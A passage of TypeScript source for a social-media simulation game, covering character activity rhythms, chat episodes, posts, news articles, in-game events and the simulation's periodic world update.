export function diurnalAt(chronotype: Character["chronotype"], localHour: number): number {
  const h = localHour;
  if (chronotype === "morning") return 0.06 + 0.9 * bump(h, 9.5, 2.3) + 0.5 * bump(h, 13, 2.2) + 0.45 * bump(h, 20.5, 2.4);
  if (chronotype === "owl") return 0.08 + 0.3 * bump(h, 14, 3) + 1.0 * bump(h, 1, 2.8);
  return 0.05 + 0.4 * bump(h, 12.5, 2.4) + 1.0 * bump(h, 22, 2.6);
}
export const localHour = (c: Pick<Character, "tz">, t: number) => (((t / HOUR + c.tz) % 24) + 24) % 24;
export const diurnal = (c: Character, t: number) => diurnalAt(c.chronotype, localHour(c, t));

const profileCache = new WeakMap<object, Float64Array>();
/** Activity-weighted presence for a set of members by UTC hour (normalised to mean 1). */
function profile(key: object, members: Character[]): Float64Array {
  let p = profileCache.get(key);
  if (p) return p;
  p = new Float64Array(48);
  let total = 0;
  for (let i = 0; i < 48; i++) {
    const t = (i / 2) * HOUR;
    let v = 0;
    for (const c of members) v += c.activity * diurnal(c, t);
    p[i] = v;
    total += v;
  }
  const mean = total / 48 || 1;
  for (let i = 0; i < 48; i++) p[i] /= mean;
  profileCache.set(key, p);
  return p;
}
const profAt = (p: Float64Array, t: number) => p[Math.floor((((t / HOUR) % 24) + 24) % 24 * 2) % 48];
export const globalActivity = (s: WorldState, t: number) => profAt(profile(s.characters, s.characters), t);
const serverActivity = (s: WorldState, srv: Server, t: number) => profAt(profile(srv.members, srv.members.map((id) => charById(s, id))), t);

// ---------- helpers ----------
export const nid = (s: WorldState, p: string) => `${p}${(s.counter++).toString(36)}`;
const HOOKS: EngineHooks = { ripple: (s, t, now, rng) => ripple(s, t, now, rng), notify: (...a) => notify(...a), nid: (s, p) => nid(s, p) };
const pro = (c: Character) => (c.opinion > 15 ? 1 : c.opinion < -15 ? -1 : 0);
export const clamp = (v: number, a: number, b: number) => Math.max(a, Math.min(b, v));
function glazeAdj(s: WorldState, c: Character) {
  const g = s.settings.glazeRatio;
  return c.opinion > 20 ? 0.3 + 1.4 * g : c.opinion < -20 ? 1.7 - 1.4 * g : 1;
}
const gapLogNormal = (rng: Rng, median = 7) => clamp(Math.exp(rng.gauss() * 0.85 + Math.log(median)), 1.5, 200) * 1000;

function remember(c: Character, topic: Topic, t: number, feeling: number) {
  if (topic.about !== "god" || topic.magnitude < 3) return;
  if (c.memory.some((m) => m.topicId === topic.id)) return;
  c.memory.push({ topicId: topic.id, label: topic.label, t, feeling });
  if (c.memory.length > 6) c.memory.shift();
}

export function notify(s: WorldState, t: number, kind: Notification["kind"], text: string, link?: string) {
  s.notifications.push({ id: nid(s, "n"), t, kind, text, link, read: false });
}

// ---------- memes ----------
export const moodOf = (c: Character): "fan" | "hater" | "neutral" => (c.opinion > 25 ? "fan" : c.opinion < -25 ? "hater" : "neutral");
/** an original meme from `c` about the topic (or what god just said) */
export function memeFor(s: WorldState, rng: Rng, c: Character, topic?: Topic, godText?: string): MemeSpec {
  const g = godText ?? (topic?.about === "god" ? s.godLog.filter((x) => x.serverId !== "dm").at(-1)?.text : undefined); // DMs stay private
  const post = topic ? [...s.posts].reverse().find((p) => p.topicId === topic.id && p.platform === "chirp" && !p.media) : undefined;
  const pa = post && post.authorId.startsWith("c") ? charById(s, post.authorId) : undefined;
  const shot = godText ? { name: s.player.displayName || "god", handle: "god", text: godText, likes: rng.int(20_000, 900_000), seed: 1, gold: true }
    : post ? { name: pa?.displayName ?? "god", handle: pa?.username ?? "god", text: post.text, likes: post.likes, seed: pa?.avatarSeed ?? 1, pfp: pa?.pfp, gold: !pa } : undefined;
  return makeMeme(rng, { q: g, topic: topic?.label ?? (godText ? "god being online" : undefined), tag: topic?.tag, mood: moodOf(c), shot });
}

// ---------- topics ----------
function channelMatch(ch: Channel, topic: Topic): number {
  const tags = ch.tags;
  if (topic.about === "god") return tags.includes("god") ? 1.6 : tags.includes("world") || tags.includes("drama") || tags.includes("rumor") ? 0.6 : 0.25;
  const map: Record<string, string[]> = { celebrity: ["celebrity", "drama", "world"], crypto: ["crypto", "memecoins", "finance"], gaming: ["gaming"], tech: ["tech", "business"], sports: ["sports", "world"], meme: ["memes", "world"], markets: ["wealth", "finance", "business", "news"], drama: ["drama", "world", "rumor"] };
  return (map[topic.category] ?? []).some((x) => tags.includes(x)) ? 1.4 : 0.15;
}

function pickTopic(s: WorldState, rng: Rng, ch: Channel): Topic | undefined {
  const live = s.topics.filter((t) => t.heat > 0.4);
  const lifeW = ch.tags.includes("life") || ch.name === "general" || ch.name === "off-topic" ? 9 : 2.5;
  const opts: [Topic | undefined, number][] = [[undefined, lifeW]];
  for (const t of live) opts.push([t, Math.sqrt(t.heat) * channelMatch(ch, t) * (t.about === "god" ? 1.4 : 1)]);
  return rng.weighted(opts, (o) => o[1])[0];
}

// ---------- chat episodes (research §5: bursts, replies, pile-ons, drift) ----------
interface EpisodeOpts { mode?: "normal" | "reaction" | "godReply"; starter?: Character; minLen?: number }

function pickSpeaker(s: WorldState, rng: Rng, srv: Server, t: number, topic: Topic | undefined, exclude?: string): Character {
  const id = rng.weighted(srv.members, (id) => {
    if (id === exclude) return 0;
    const c = charById(s, id);
    const interest = topic && topic.about === "world" && c.interests.includes(topic.category) ? 1.6 : 1;
    return c.activity * diurnal(c, t) * glazeAdj(s, c) * interest;
  });
  return charById(s, id);
}

function reactionsFor(s: WorldState, rng: Rng, srv: Server, c: Character | undefined, intent: string, heat: number) {
  const p = intent === "open" ? 0.45 : intent === "joke" || intent === "pileon" || intent === "godReply" ? 0.4 : 0.12;
  if (!rng.chance(p)) return [];
  const pool = REACTIONS[srv.vibe] ?? REACTIONS.culture;
  const n = rng.int(1, 3);
  const out: { emoji: string; count: number }[] = [];
  for (let i = 0; i < n; i++) {
    const e = i === 0 && c && rng.chance(0.3) ? c.emojis[0] : rng.pick(pool);
    if (out.some((x) => x.emoji === e)) continue;
    out.push({ emoji: e, count: Math.max(1, Math.round(Math.exp(rng.gauss() * 0.8) * (1 + heat / 6) * (i === 0 ? 2 : 1))) });
  }
  return out;
}

/** dedupe key: case, emoji, punctuation and @handles don't make a line "new" */
export const textKey = (t: string) => t.toLowerCase().replace(/@[\w.]+/g, "").replace(/[^\p{L}\p{N} ]/gu, "").replace(/\s+/g, " ").trim();
export const seenText = (s: WorldState, t: string) => s.recentTexts.includes(textKey(t));
export function rememberText(s: WorldState, t: string) {
  s.recentTexts.push(textKey(t));
  if (s.recentTexts.length > 600) s.recentTexts.splice(0, s.recentTexts.length - 600);
}

function chatText(s: WorldState, rng: Rng, c: Character, intent: Intent, srv: Server, ch: Channel, t: number, topic?: Topic, target?: Character, typoWord?: string): { text: string; typoWord?: string; clean?: string } {
  const gen = getGenerator();
  let out = gen.chat({ rng, state: s, speaker: c, intent, topic, target, server: srv, channel: ch, t, typoWord });
  for (let i = 0; i < 5 && out.text.length > 14 && seenText(s, out.clean ?? out.text); i++) out = gen.chat({ rng, state: s, speaker: c, intent, topic, target, server: srv, channel: ch, t, typoWord });
  if (out.text.length > 14) rememberText(s, out.clean ?? out.text);
  return out;
}

export function runEpisode(s: WorldState, rng: Rng, srv: Server, ch: Channel, t: number, topic: Topic | undefined, opts: EpisodeOpts = {}): Message[] {
  const epId = nid(s, "e");
  const msgs: Message[] = [];
  let cur = t;
  let conflicts = 0;
  let modded = false;
  let pendingTypo: { who: Character; word: string } | undefined;
  let lastIntent = "open" as Intent;
  const heat = topic?.heat ?? 2;

  const emit = (c: Character, intent: Intent, target?: Character, replyTo?: string) => {
    const r = chatText(s, rng, c, intent, srv, ch, cur, topic, target, pendingTypo?.word);
    const m: Message = {
      id: nid(s, "m"), episodeId: epId, serverId: srv.id, channelId: ch.id, authorId: c.id, text: r.text, t: Math.round(cur), topicId: topic?.id, replyTo,
      reactions: reactionsFor(s, rng, srv, c, intent, heat), kind: intent === "mod" ? "system" : "chat", intent, score: 0,
    };
    if (/@god\b/i.test(r.text)) m.mentionsGod = true;
    if (r.clean && r.clean !== r.text && rng.chance(0.45)) { m.editText = r.clean; m.editedAt = Math.round(cur + rng.range(4, 20) * 1000); }
    m.score = (c.tier === "power" ? 2 : c.tier === "regular" ? 1 : 0.5) + m.reactions.reduce((a, x) => a + x.count, 0) + (c.influencer ? 3 : 0);
    msgs.push(m);
    s.stats.messages++;
    c.postCount++;
    lastIntent = intent;
    pendingTypo = r.typoWord && !m.editText ? { who: c, word: r.typoWord } : undefined;
    if (topic) {
      const feel = intent.startsWith("disagree") || c.opinion < -15 ? -0.6 : c.opinion > 15 ? 0.7 : 0;
      remember(c, topic, cur, feel);
      if (topic.about === "god") c.opinion = clamp(c.opinion + topic.valence * 0.25 + (rng.next() - 0.5) * 0.4, -100, 100);
    }
    if (c.tier !== "lurker" && srv.id !== "dm" && /@god\b/i.test(r.text) && rng.chance(0.04)) notify(s, cur, "mention", `@${c.username} mentioned you in ${srv.name} #${ch.name}`, `lounge:${srv.id}:${ch.id}`);
    return m;
  };

  const starter = opts.starter ?? pickSpeaker(s, rng, srv, t, topic);
  const r0 = rng.next();
  const godish = srv.id !== "dm" && (ch.tags.includes("god") || srv.bias > 0.3);
  const openIntent: Intent = opts.mode === "godReply" ? (starter.opinion < -20 ? "godReplyHater" : "godReply") : topic ? "open" : r0 < 0.07 && srv.insideJokes.length ? "inside" : godish && r0 < 0.4 ? "ambient" : "personal";
  emit(starter, openIntent);

  const mag = topic?.magnitude ?? 2;
  let n = Math.round(clamp(Math.exp(rng.gauss() * 0.75 + Math.log(topic ? 4 + heat / 12 : 3)), 0, 32));
  if (opts.mode === "reaction" || opts.mode === "godReply") n = Math.max(n, Math.round(4 + mag * 1.6 + rng.poisson(mag)));
  if (opts.minLen) n = Math.max(n, opts.minLen);
  // a few "chatty" pile-on threads are much longer
  if (topic && topic.about === "god" && rng.chance(0.05 + s.settings.drama * 0.08)) n += rng.int(6, 16);

  for (let i = 0; i < n; i++) {
    const last = msgs[msgs.length - 1];
    const lastA = last.authorId.startsWith("c") ? charById(s, last.authorId) : starter;
    // typo self-correction (research §2)
    if (pendingTypo && rng.chance(0.45)) {
      cur += rng.range(2, 7) * 1000;
      const w = pendingTypo.who;
      emit(w, "fix");
      continue;
    }
    // self follow-up / burst (research §5)
    let streak = 0;
    for (let k = msgs.length - 1; k >= 0 && msgs[k].authorId === lastA.id; k--) streak++;
    if (streak < 3 && rng.chance(lastA.tier === "power" ? 0.24 : 0.14) && lastA.id !== "god") {
      cur += rng.range(1.5, 9) * 1000;
      emit(lastA, rng.chance(0.55) ? "followup" : topic ? "open" : "personal");
      continue;
    }
    // mod steps in after sustained conflict
    if (conflicts >= 3 && !modded && srv.moderators.length) {
      modded = true;
      const mod = charById(s, rng.pick(srv.moderators));
      cur += gapLogNormal(rng, 20);
      emit(mod, "mod");
      if (rng.chance(0.5)) break;
      continue;
    }
    // responder: friends/rivals of last author, previous participants, or anyone online
    const participants = [...new Set(msgs.map((m) => m.authorId))].filter((id) => id !== lastA.id);
    const social = [...lastA.friends, ...lastA.rivals].filter((id) => srv.members.includes(id));
    const roll = rng.next();
    const resp = roll < 0.3 && social.length ? charById(s, rng.pick(social)) : roll < 0.55 && participants.length ? charById(s, rng.pick(participants)) : pickSpeaker(s, rng, srv, cur, topic, lastA.id);
    if (resp.id === lastA.id) continue;
    let intent: Intent;
    if (lastIntent === "question") intent = "answer";
    else if (i > 2 && rng.chance(0.07)) intent = "drift";
    else if (topic?.about === "god") {
      const a = pro(resp), b = pro(lastA);
      if (a === 0) intent = rng.weighted<Intent>(["question", "joke", "open", "agree", "memory"], (x) => ({ question: 3, joke: 2, open: 2, agree: 1, memory: resp.memory.length ? 1 : 0 } as Record<string, number>)[x]);
      else if (a === b || b === 0) intent = conflicts > 0 && rng.chance(0.45) ? "pileon" : rng.weighted<Intent>(["agree", "backup", "joke", "open", "memory"], (x) => ({ agree: 4, backup: lastA.friends.includes(resp.id) ? 3 : 0.5, joke: resp.stance === "memer" ? 4 : 1.5, open: 2.5, memory: resp.memory.length ? 1.2 : 0 } as Record<string, number>)[x]);
      else { intent = a > 0 ? "disagreeFan" : "disagreeHater"; conflicts++; }
      if (resp.stance === "memer" && rng.chance(0.3)) intent = "joke";
    } else {
      intent = rng.weighted<Intent>(["agree", "joke", "question", "disagreeNeutral", "open", "followup"], (x) => ({ agree: 3, joke: 2.5, question: topic ? 1 : 0.3, disagreeNeutral: 1.2, open: topic ? 2 : 0.5, followup: 0 } as Record<string, number>)[x]);
      if (!topic && intent === "open") intent = "personal";
    }
    cur += lastIntent === "pileon" || intent === "pileon" ? rng.range(2, 10) * 1000 : gapLogNormal(rng);
    let replyTo = rng.chance(intent.startsWith("disagree") || intent === "answer" ? 0.55 : 0.22) ? (rng.chance(0.75) ? last.id : rng.pick(msgs).id) : undefined;
    let older: Message | undefined;
    if (!replyTo && i === 0 && rng.chance(0.06)) older = olderInChannel(s, rng, ch.id, t);
    if (older) replyTo = older.id;
    const rm = older ?? (replyTo ? msgs.find((m) => m.id === replyTo) : undefined);
    const target = rm ? (rm.authorId.startsWith("c") ? charById(s, rm.authorId) : lastA) : lastA;
    if (intent === "drift") {
      emit(resp, "drift", target, replyTo);
      const nt = s.topics.filter((x) => x.about === "world" && x.heat > 1);
      topic = nt.length && rng.chance(0.6) ? rng.pick(nt) : undefined;
      continue;
    }
    emit(resp, intent, target, replyTo);
  }
  // occasional bot output after a busy thread (fictional bots: Tally, Starboard+)
  if (srv.id !== "dm" && msgs.length > 6 && rng.chance(0.12)) {
    const top = msgs.reduce((a, b) => (b.score > a.score ? b : a));
    const who = charById(s, top.authorId.startsWith("c") ? top.authorId : starter.id);
    cur += rng.range(1, 4) * 1000;
    msgs.push({
      id: nid(s, "m"), episodeId: epId, serverId: srv.id, channelId: ch.id, authorId: rng.chance(0.5) ? "bot-tally" : "bot-starboard", t: Math.round(cur), kind: "bot", reactions: [], score: 0.2,
      text: expand(rng.pick(BOT_LINES.slice(0, 2)), { user: who.username, n: String(rng.int(3, 60)), label: topic?.label ?? "this" }, rng),
    });
    s.stats.messages++;
  }
  // sometimes someone drops a meme into the conversation
  const mr = rngFor(s.seed, "meme", epId);
  const memeP = (ch.tags.includes("memes") || ch.name.includes("meme") ? 0.45 : 0.1) * (opts.mode === "reaction" ? 1.6 : 1);
  if (msgs.length >= 2 && mr.chance(memeP)) {
    const cands = msgs.slice(1).filter((m) => m.kind === "chat" && !m.threadOf);
    const m = cands.length ? mr.weighted(cands, (x) => (charById(s, x.authorId).stance === "memer" ? 4 : 1)) : undefined;
    if (m) {
      m.meme = memeFor(s, mr, charById(s, m.authorId), topic);
      if (mr.chance(0.6)) { m.text = mr.pick(MEME_LINES); m.editText = undefined; m.editedAt = undefined; }
      m.score += 2;
    }
  }
  s.pending.push(...msgs);
  return msgs;
}

function olderInChannel(s: WorldState, rng: Rng, channelId: string, t: number): Message | undefined {
  const out: Message[] = [];
  for (let i = s.messages.length - 1, n = 0; i >= 0 && n < 400 && out.length < 12; i--, n++) {
    const m = s.messages[i];
    if (m.channelId === channelId && m.kind === "chat" && t - m.t > 3 * MIN && !m.threadOf) out.push(m);
  }
  return out.length ? rng.pick(out) : undefined;
}

function startRandomEpisode(s: WorldState, rng: Rng, t: number) {
  const srv = rng.weighted(s.servers, (x) => Math.sqrt(x.members.length) * serverActivity(s, x, t) * (1 + (x.bias > 0.3 ? 0.2 : 0)));
  const w = srv.channels.map((c, i) => {
    // the Undernet's drop/ransom channels belong to the crew; random chatter lives in #lobby
    const def = (c.announce ? 0 : 1) * (c.name === "general" || c.name === "lobby" ? 5 : 1) * (srv.id === "undernet" && c.name !== "lobby" ? 0.04 : 1);
    return [c, def, i] as const;
  });
  const ch = rng.weighted(w, (x) => x[1])[0];
  const topic = pickTopic(s, rng, ch);
  runEpisode(s, rng, srv, ch, t, topic);
}

// ---------- platforms ----------
const PLATFORM_W: [PlatformId, number][] = [["chirp", 55], ["snapgram", 12], ["clipz", 12], ["threadit", 10], ["tubeverse", 5], ["wire", 6]];
const THREADIT_SUBS: Record<string, string> = { god: "t/GodWatchers", crypto: "t/CryptoMoonshots", gaming: "t/PixelArena", celebrity: "t/Fauxpopculture", tech: "t/gadgets_sim", markets: "t/WealthTalk", meme: "t/memes_sim", drama: "t/SimDrama", sports: "t/sportsball" };

export function engagementFor(rng: Rng, author: Character | undefined, heat: number, godAuthor = false, followers = 0) {
  const f = godAuthor ? followers : author?.followers ?? 100;
  const views = Math.round(f * Math.exp(rng.gauss() * 0.9) * (0.08 + heat / 40) * (godAuthor ? 1.2 : 1) + rng.int(20, 400));
  const likes = Math.round(views * 0.035 * Math.exp(rng.gauss() * 0.6));
  // views/likes/reposts are derived from audience size; replies only count stored replies
  return { views, likes, reposts: Math.round(likes * rng.range(0.05, 0.2)), replies: 0 };
}

export function makePost(s: WorldState, rng: Rng, t: number, o: { topic?: Topic | null; author?: Character; platform?: PlatformId; quote?: boolean; replyToId?: string } = {}): Post {
  const platform = o.platform ?? rng.weighted(PLATFORM_W, (x) => x[1])[0];
  const author = o.author ?? rng.weighted(s.characters, (c) => c.activity * diurnal(c, t) * (c.influencer ? 6 : 1) * glazeAdj(s, c));
  let topic: Topic | undefined = o.topic === null ? undefined : o.topic;
  if (o.topic === undefined) {
    const r = rng.next();
    const god = s.topics.filter((x) => x.about === "god" && x.heat > 0.5), world = s.topics.filter((x) => x.about === "world" && x.heat > 0.5);
    topic = r < 0.5 && god.length ? rng.weighted(god, (x) => x.heat) : r < 0.78 && world.length ? rng.weighted(world, (x) => x.heat) : undefined;
  }
  const recent = s.posts.slice(-80).filter((p) => p.platform === platform && p.t <= t);
  let quoteOf: string | undefined, replyTo: string | undefined, text: string, title: string | undefined;
  const gen = getGenerator();
  const forced = o.replyToId ? s.posts.find((p) => p.id === o.replyToId) : undefined;
  if (forced || (platform === "chirp" && recent.length && rng.chance(0.22))) {
    const target = forced ?? rng.weighted(recent, (p) => p.score + 1);
    const tc = target.authorId.startsWith("c") ? charById(s, target.authorId) : undefined;
    const srv = s.servers[0];
    topic = target.topicId ? s.topics.find((x) => x.id === target.topicId) : topic;
    const intent: Intent = tc && pro(tc) * pro(author) < 0 ? (pro(author) > 0 ? "disagreeFan" : "disagreeHater") : rng.pick(["agree", "joke", "question", "open"] as Intent[]);
    text = gen.chat({ rng, state: s, speaker: author, intent, topic, target: tc, server: srv, channel: srv.channels[0], t }).text;
    if (!forced && rng.chance(0.4)) quoteOf = target.id; else { replyTo = target.id; target.replies += 1; }
  } else {
    const seen = new Set(s.posts.slice(-200).map((p) => p.text.toLowerCase()));
    let r = gen.post({ rng, state: s, author, topic, t, platform });
    for (let k = 0; k < 4 && seen.has(r.text.toLowerCase()); k++) r = gen.post({ rng, state: s, author, topic, t, platform });
    text = r.text; title = r.title;
  }
  const e = engagementFor(rng, author, topic?.heat ?? 1);
  const post: Post = {
    id: nid(s, "p"), platform, authorId: author.id, text, title, t: Math.round(t), topicId: topic?.id, quoteOf, replyTo, ...e,
    community: platform === "threadit" ? THREADIT_SUBS[topic?.about === "god" ? "god" : topic?.category ?? "meme"] ?? "t/AskAnything" : undefined,
    media: platform === "snapgram" || platform === "clipz" || platform === "tubeverse" || rng.chance(0.15) ? { hue: rng.int(0, 360), label: topic?.tag ?? rng.pick(["sunset", "coffee", "gym", "setup", "city"]), kind: platform === "clipz" || platform === "tubeverse" ? "video" : rng.chance(0.2) ? "meme" : "photo" } : undefined,
    score: 0,
  };
  if (post.media?.kind === "meme") post.media.meme = memeFor(s, rngFor(s.seed, "pm", post.id), author, topic);
  if (topic && ["rumor", "allegation", "leak"].includes(topic.category) && (author.stance === "conspiracist" || author.stance === "worshipper" || author.stance === "hater") && rng.chance(0.4))
    post.communityNote = rng.pick(["Readers added context: No primary source confirms this claim. The earliest version traces to an anonymous account.", "Readers added context: The image in this post is from an unrelated event in 2024 (in-sim).", "Readers added context: The figure cited is an estimate from a fan spreadsheet, not a filing."]);
  if (topic?.amount && author.stance === "worshipper" && rng.chance(0.15)) post.communityNote = `Readers added context: Reported value is ${fmtMoney(topic.amount)}, not the larger figure claimed in this post.`;
  post.score = Math.log10(post.likes + 10) + (author.influencer ? 1 : 0);
  s.posts.push(post);
  s.stats.posts++;
  author.postCount++;
  return post;
}

// ---------- news ----------
function pickOutlet(s: WorldState, rng: Rng, topic: Topic) {
  return rng.weighted(s.outlets, (o) => {
    const strict = STRICT_BEATS[o.id];
    if (strict) return strict.includes(topic.category) ? 3 : 0;
    return topic.about === "god" ? (o.beats.includes("god") ? 3 : 1) : o.beats.includes(topic.category) || (topic.category === "celebrity" && o.beats.includes("drama")) ? 3 : 0.4;
  });
}

export function makeArticle(s: WorldState, rng: Rng, topic: Topic, t: number, kind?: ArticleKind): Article {
  const outlet = pickOutlet(s, rng, topic);
  const k: ArticleKind = kind ?? (topic.breaking && t - topic.startedAt < 30 * MIN ? "breaking" : rng.weighted<ArticleKind>(["report", "opinion", "rumor", "financial", "interview", "investigation"], (x) => ({ report: 4, opinion: 2, rumor: ["rumor", "leak", "allegation"].includes(topic.category) ? 4 : 0.5, financial: topic.amount ? 3 : 0.3, interview: 1, investigation: topic.about === "god" ? 0.8 : 0.2 } as Record<string, number>)[x]));
  const pool = [...s.messages.slice(-1500), ...s.pending].filter((m) => m.topicId === topic.id && m.t <= t && m.serverId !== "dm" && m.authorId.startsWith("c") && m.text.length > 22);
  const quotes = rng.shuffle(pool.slice(-40)).slice(0, 3).map((m) => ({ who: charById(s, m.authorId), text: m.text, where: s.servers.find((x) => x.id === m.serverId)!.name }));
  const body = getGenerator().article({ rng, state: s, outlet, topic, kind: k, t, quotes });
  const comments: Article["comments"] = [];
  let ct = t + rng.range(1, 5) * MIN;
  for (let i = 0, n = rng.int(3, 10); i < n; i++) {
    const c = rng.weighted(s.characters, (x) => x.activity * (topic.about === "world" && x.interests.includes(topic.category) ? 2 : 1));
    const srv = s.servers.find((x) => x.id === c.servers[0])!;
    const intent: Intent = rng.pick(["open", "agree", "joke", "question", c.opinion < -20 ? "disagreeHater" : "disagreeFan"] as Intent[]);
    comments.push({ authorId: c.id, text: getGenerator().chat({ rng, state: s, speaker: c, intent, topic, server: srv, channel: srv.channels[0], t: ct }).text, t: Math.round(ct), likes: Math.round(Math.exp(rng.gauss() + 2)) });
    ct += gapLogNormal(rng, 90);
  }
  const a: Article = {
    id: nid(s, "a"), outletId: outlet.id, kind: k, ...body, author: rng.pick(outlet.authors).name, t: Math.round(t), topicId: topic.id, comments,
    reactions: [["🔥", 4], ["😮", 2], ["😂", 2], ["🤡", topic.valence < 0 ? 3 : 1], ["👑", topic.valence > 0 ? 3 : 0.5]].map(([e, w]) => ({ emoji: e as string, count: Math.round((w as number) * topic.magnitude * Math.exp(rng.gauss() * 0.5) * 40) })),
    reads: Math.round(Math.exp(rng.gauss() * 0.6) * topic.magnitude * 18000),
  };
  s.articles.push(a);
  s.stats.articles++;
  // outlet echoes on Chirp
  const p: Post = { id: nid(s, "p"), platform: "chirp", authorId: `o-${outlet.id}`, text: a.headline + (k === "breaking" ? " 🚨" : ""), t: Math.round(t + 20_000), topicId: topic.id, breaking: k === "breaking", likes: 0, reposts: 0, replies: 0, views: 0, score: 3, quoteOf: undefined };
  Object.assign(p, engagementFor(rng, undefined, topic.heat, true, 900_000 + topic.magnitude * 200_000));
  p.title = a.id; // link to article
  s.posts.push(p);
  s.stats.posts++;
  if (topic.about === "god" && (k === "breaking" || topic.magnitude >= 5.5)) notify(s, t, "news", `${outlet.name}: ${a.headline}`, `article:${a.id}`);
  return a;
}

// ---------- events ----------
function spawnEvent(s: WorldState, rng: Rng, t: number) {
  const def = rng.weighted(EVENT_DEFS, (d) => d.weight);
  const m = def.make(rng, s);
  const ev: InteractiveEvent = { id: nid(s, "ev"), type: def.type, title: m.title, body: m.body, fromId: m.fromId, t: Math.round(t), choices: def.choices, expiresAt: Math.round(t + 8 * HOUR), data: m.data };
  s.events.push(ev);
  notify(s, t, "event", `New situation: ${ev.title}`, `event:${ev.id}`);
}

// ---------- the bucket step ----------
function decay(s: WorldState, dt: number) {
  for (const tp of s.topics) {
    const half = (1.2 + tp.magnitude * 0.45) * HOUR;
    tp.heat *= Math.pow(0.5, dt / half);
  }
}

function drift(s: WorldState, rng: Rng | null, dt: number) {
  const vol: Record<string, [number, number]> = { coin: [0, 0.012], investment: [0.00002, 0.0025], business: [0.00003, 0.0018], property: [0.00001, 0.0005], island: [0.00001, 0.0004], jet: [-0.00001, 0.0002], vehicle: [-0.00002, 0.0003], organization: [0, 0.0002], account: [0, 0.001] };
  const steps = dt / (5 * MIN);
  for (const h of s.player.holdings) {
    const [mu, sd] = vol[h.kind] ?? [0, 0.001];
    h.value = Math.max(1000, h.value * Math.exp(mu * steps + (rng ? rng.gauss() * sd * Math.sqrt(steps) : 0)));
    if (h.yieldPerDay) s.player.cash += h.yieldPerDay * (dt / DAY);
  }
  s.player.followers = Math.round(s.player.followers * (1 + 0.000015 * (s.player.influence / 50) * steps));
}

function prune(s: WorldState) {
  const before = s.messages.length;
  if (before > 9000) {
    // keep the newest 6500 overall, plus each channel's last 40 and its 10 best older messages
    const keep = new Set<string>(s.messages.slice(-6500).map((m) => m.id));
    const byCh = new Map<string, Message[]>();
    for (const m of s.messages) (byCh.get(m.channelId) ?? byCh.set(m.channelId, []).get(m.channelId)!).push(m);
    for (const list of byCh.values()) {
      for (const m of list.slice(-40)) keep.add(m.id);
      for (const m of list.slice(0, -40).sort((a, b) => b.score - a.score).slice(0, 10)) keep.add(m.id);
    }
    s.messages = s.messages.filter((m) => keep.has(m.id));
    s.stats.pruned += before - s.messages.length;
  }
  if (s.posts.length > 2600) s.posts = s.posts.slice(-2200);
  if (s.recentTexts.length > 600) s.recentTexts = s.recentTexts.slice(-600);
  if (s.articles.length > 260) s.articles = s.articles.slice(-220);
  if (s.notifications.length > 160) s.notifications = s.notifications.slice(-140);
  if (s.player.history.length > 200) s.player.history = s.player.history.slice(-200);
  if (s.events.length > 40) s.events = s.events.filter((e) => !e.resolved).concat(s.events.filter((e) => e.resolved).slice(-20));
  s.topics = s.topics.filter((t) => t.heat > 0.15 || t.about === "god" && t.magnitude >= 7).slice(-70);
  if (s.player.netWorthHistory.length > 600) s.player.netWorthHistory = s.player.netWorthHistory.filter((_, i) => i % 2 === 0);
}

function celebPick(s: WorldState, rng: Rng) {
  const c = rng.pick(s.celebrities);
  return charById(s, c.id);
}

export function processBucket(s: WorldState, b: number) {
  const t0 = b * BUCKET, t1 = t0 + BUCKET;
  const rng = rngFor(s.seed, "b", b);
  const act = s.settings.activity;
  const ga = globalActivity(s, t0);
  const godHeat = s.topics.reduce((a, t) => a + (t.about === "god" ? t.heat : 0), 0);
  const heatBoost = 1 + Math.min(2.5, godHeat / 80) * (0.5 + s.settings.drama);
  const nEp = rng.poisson((EPISODES_PER_HOUR / 360) * act * ga * heatBoost);
  for (let i = 0; i < nEp; i++) startRandomEpisode(s, rng, t0 + rng.next() * BUCKET);
  const nPost = rng.poisson((POSTS_PER_HOUR / 360) * act * ga * heatBoost);
  for (let i = 0; i < nPost; i++) makePost(s, rng, t0 + rng.next() * BUCKET);
  // characters DM each other now and then
  if (rng.chance(0.03 * act * ga)) ambientDm(s, rng, t0 + rng.next() * BUCKET);
  // people react to messages that are already there
  if (s.messages.length && rng.chance(0.5 * act)) {
    for (let k = 0, n = rng.int(1, 3); k < n; k++) {
      const m = s.messages[s.messages.length - 1 - rng.int(0, Math.min(250, s.messages.length - 1))];
      if (m.kind !== "chat" || t0 - m.t > 30 * MIN || m.serverId === "dm") continue;
      const srv = s.servers.find((x) => x.id === m.serverId);
      if (!srv) continue;
      const by = rng.pick(srv.members);
      const pool = REACTIONS[srv.vibe] ?? REACTIONS.culture;
      const existing = m.reactions.length && rng.chance(0.6) ? rng.pick(m.reactions).emoji : rng.pick(pool);
      (m.reactionLog ??= []).push([existing, Math.round(t0 + rng.next() * BUCKET), by]);
    }
  }
  // the channel the player is looking at never goes dead while it's "active"
  const f = s.focus;
  if (f && t0 - f.t < 90_000 && f.serverId !== "dm") {
    const srv = s.servers.find((x) => x.id === f.serverId);
    const ch = srv?.channels.find((c) => c.id === f.channelId);
    if (srv && ch && !ch.announce) {
      let lastT = 0, upcoming = false;
      for (const m of s.pending) if (m.channelId === ch.id) { if (m.t >= t0) upcoming = true; else lastT = Math.max(lastT, m.t); }
      for (let i = s.messages.length - 1, n = 0; i >= 0 && n < 600; i--, n++) if (s.messages[i].channelId === ch.id) { lastT = Math.max(lastT, s.messages[i].t); break; }
      const quietFor = t0 - lastT;
      const busy = clamp(serverActivity(s, srv, t0) * act * (ch.name === "general" ? 1.4 : 0.8), 0.15, 2);
      if (!upcoming && quietFor > 12_000 / busy && rng.chance(clamp(0.35 * busy, 0.08, 0.8))) runEpisode(s, rng, srv, ch, t0 + rng.range(1, 6) * 1000, pickTopic(s, rng, ch));
    }
  }
  // shared event bus: deliver world events whose time has come
  if (s.bus.length) {
    const due = s.bus.filter((e) => e.t < t1).sort((a, b) => a.t - b.t);
    if (due.length) {
      s.bus = s.bus.filter((e) => e.t >= t1);
      for (const e of due) { if (e.kind === "undernet") undernetBus(s, e, HOOKS); else handleBus(s, e); }
    }
  }

  if (s.voice?.god && !s.voice.god.leftAt) voiceTick(s, t1);
  if (b % 30 === 0) {
    decay(s, 5 * MIN);
    undernetTick(s, t0);
    if (rng.chance(0.24 * act)) {
      const c = celebPick(s, rng);
      s.topics.push(worldTopic(rng, nid(s, "t"), t0, c.displayName, c.id));
    }
    if (rng.chance(0.055 * act * (0.6 + s.settings.drama))) {
      const c = celebPick(s, rng);
      const tp = autoGodTopic(rng, nid(s, "t"), t0, c.displayName, c.id);
      s.topics.push(tp);
